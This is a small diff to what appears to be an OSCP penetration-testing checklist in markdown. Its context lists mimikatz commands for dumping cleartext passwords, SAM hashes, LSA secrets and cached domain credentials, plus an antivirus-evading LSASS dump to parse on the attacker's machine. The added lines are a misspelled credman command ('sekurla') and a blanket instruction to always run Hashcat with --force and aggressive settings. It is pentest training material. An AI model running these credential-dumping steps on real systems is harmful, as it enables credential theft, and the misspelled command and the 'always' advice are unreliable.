@@ -692,6 +692,7 @@ sekurlsa::wdigest              # cleartext (older systems)
 lsadump::sam                   # local SAM hashes
 lsadump::lsa /patch            # LSA secrets
 lsadump::cache                 # cached domain creds
+sekurla::credman               #windows cred
 
 # LSASS dump (AV evasion — no mimikatz binary needed):
 # Task Manager → lsass.exe → Create dump file → transfer → parse on attacker
@@ -1550,7 +1551,7 @@ hash-identifier   # interactive
 ```
 
 ### Hashcat Modes Reference
-
+always add this '--force -O -w 4 --opencl-device-types 1,2'
 [](https://github.com/C0mpi11er/OscpCheckList2026/blob/main/OSCP_Complete_Checklist_Fixed.md#hashcat-modes-reference)
 
 ```shell
